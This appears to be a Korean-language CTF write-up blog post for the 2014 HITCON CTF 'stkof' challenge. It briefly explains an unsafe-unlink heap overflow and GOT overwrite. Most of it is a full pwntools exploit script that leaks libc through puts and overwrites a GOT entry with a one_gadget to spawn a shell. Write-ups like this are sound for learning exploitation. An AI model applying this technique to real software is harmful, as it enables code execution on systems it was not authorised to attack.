---
title: "2014 HITCON CTF stkof"
date: 2020-4-18
ctf: HITCON CTF
layout: post
---

* unsafe unlink
* heap overflow
* bss manage

1번 메뉴에서 원하는 사이즈만큼 힙에 할당하고 전역변수에 청크주소를 저장한다. 2번 메뉴에서는 원하는 사이즈만큼 청크내용을 수정할 수 있다. 3번 메뉴는 청크를 프리해주고 0으로 초기화해준다. 4번 메뉴는 별거 없다.

fake chunk를 구성해줘서 fd는 target - 24 bk는 target - 16에 맞춰주고 다음 청크의 prev_size와 size를 맞춰주고 size는 PREV_INUSE bit를 없애준다. 그리고 edit을 이용해서 strlen@got -> puts@plt(puts@got) 로 맞춰서 leak해주고 one_gadget으로 got를 덮어주면 된다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./stkof')
p = process('./stkof')
libc = e.libc
s = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
cnt = 0x0000000000602100
chunk = 0x0000000000602150

def add(size):
	sl('1')
	sl(str(size))
	p.recvuntil('OK\n')

def edit(idx,size,content):
	sl('2')
	sl(str(idx))
	sl(str(size))
	s(content)

def free(idx):
	sl('3')
	sl(str(idx))

def leak(idx):
	sl('4')
	sl(str(idx))

add(0x80)
add(0x80)
add(0x80)

fakechunk1 = p64(0) # prev_size 
fakechunk1 += p64(0) # size
fakechunk1 += p64(chunk - 24) # fd
fakechunk1 += p64(chunk - 16) # bk
fakechunk1 += p64(0) * 12
fakechunk1 += p64(0x80) # prev_size
fakechunk1 += p64(0x90) # size
edit(2,len(fakechunk1),fakechunk1)

free(3) # unlink

payload = 'A'*0x18
payload += p64(e.got['strlen']) # strlen -> puts
payload += p64(e.got['puts'])
edit(2,len(payload),payload)
edit(2,8,p64(e.plt['puts']))
# strlen@got -> puts@plt(puts@got)

leak(3)
puts = u64(p.recvuntil('\x7f')[-6:]+'\x00\x00')
log.info(hex(puts))
libc_base = puts - libc.symbols['puts']
log.info(hex(libc_base))
oneshot = libc_base + 0x45216
pause()
edit(3,8,p64(oneshot))
# puts@got -> one_gadget


p.interactive()
```

